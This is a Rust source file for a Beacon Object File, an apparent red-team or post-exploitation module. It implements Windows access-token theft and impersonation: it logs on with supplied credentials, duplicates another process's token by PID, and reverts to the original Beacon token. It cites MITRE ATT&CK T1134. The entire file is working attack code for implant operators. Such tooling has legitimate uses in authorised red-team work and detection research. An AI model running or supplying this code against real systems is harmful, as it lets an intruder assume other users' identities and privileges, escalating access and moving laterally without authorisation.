//! # Token BOF
//!
//! Creates an impersonation token from explicit credentials, duplicates a
//! token from a selected process, or reverts the current Beacon token.
//!
//! ## MITRE ATT&CK
//! - T1134.001 - Access Token Manipulation: Token Impersonation/Theft
//! - T1134.003 - Access Token Manipulation: Make and Impersonate Token
//!
//! ## Arguments
//! - `str`: Action: `make`, `steal`, or `revert`.
//! - `make`: `str` domain, `str` username, `str` password, `int` logon type.
//! - `steal`: `int` process ID.

#![no_std]

use alloc::string::String;
use rustbof::{
    data::DataParser,
    eprintln, println,
    str::to_wide,
    token::{revert_token, use_token},
};
use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, GetLastError},
    Security::{
        DuplicateTokenEx, LOGON32_PROVIDER_DEFAULT, LogonUserW, SecurityImpersonation,
        TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY, TokenImpersonation,
    },
    System::Threading::{OpenProcess, OpenProcessToken, PROCESS_QUERY_LIMITED_INFORMATION},
};

fn make_token(parser: &mut DataParser) {
    let domain = String::from(parser.get_str());
    let username = String::from(parser.get_str());
    let password = String::from(parser.get_str());
    let requested_type = parser.get_int();
    if domain.len() > 256 || username.is_empty() || username.len() > 256 || password.len() > 1024 {
        eprintln!("[-] Invalid token make arguments.");
        return;
    }

    let logon_type = match requested_type {
        2..=5 | 8 | 9 => requested_type as u32,
        _ => 9,
    };
    let domain = to_wide(&domain);
    let username_wide = to_wide(&username);
    let mut password_wide = to_wide(&password);
    let mut token = core::ptr::null_mut();
    let result = unsafe {
        LogonUserW(
            username_wide.as_ptr(),
            domain.as_ptr(),
            password_wide.as_ptr(),
            logon_type,
            LOGON32_PROVIDER_DEFAULT,
            &mut token,
        )
    };
    password_wide.fill(0);
    if result == FALSE {
        eprintln!("[-] LogonUserW failed: {}", unsafe { GetLastError() });
        return;
    }

    if use_token(token) {
        println!(
            "[+] Impersonating {} with logon type {}.",
            username, logon_type
        );
    } else {
        eprintln!("[-] BeaconUseToken failed: {}", unsafe { GetLastError() });
        unsafe { CloseHandle(token) };
    }
}

fn steal_token(pid: u32) {
    if pid == 0 {
        eprintln!("[-] Process ID must be non-zero.");
        return;
    }

    unsafe {
        let process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if process.is_null() {
            eprintln!("[-] OpenProcess failed: {}", GetLastError());
            return;
        }

        let mut source = core::ptr::null_mut();
        if OpenProcessToken(
            process,
            TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE,
            &mut source,
        ) == FALSE
        {
            let error = GetLastError();
            CloseHandle(process);
            eprintln!("[-] OpenProcessToken failed: {}", error);
            return;
        }

        let mut duplicate = core::ptr::null_mut();
        let success = DuplicateTokenEx(
            source,
            TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE,
            core::ptr::null(),
            SecurityImpersonation,
            TokenImpersonation,
            &mut duplicate,
        );
        CloseHandle(source);
        CloseHandle(process);
        if success == FALSE {
            eprintln!("[-] DuplicateTokenEx failed: {}", GetLastError());
            return;
        }

        if use_token(duplicate) {
            println!("[+] Impersonating a duplicated token from PID {}.", pid);
        } else {
            eprintln!("[-] BeaconUseToken failed: {}", GetLastError());
            CloseHandle(duplicate);
        }
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    if args.is_null() || len == 0 {
        eprintln!("Usage: token <make|steal|revert> [...]");
        return;
    }

    let mut parser = DataParser::new(args, len);
    match parser.get_str() {
        "make" => make_token(&mut parser),
        "steal" => steal_token(parser.get_int().max(0) as u32),
        "revert" => {
            revert_token();
            println!("[+] Reverted to the original Beacon token.");
        }
        _ => eprintln!("Usage: token <make|steal|revert> [...]"),
    }
}
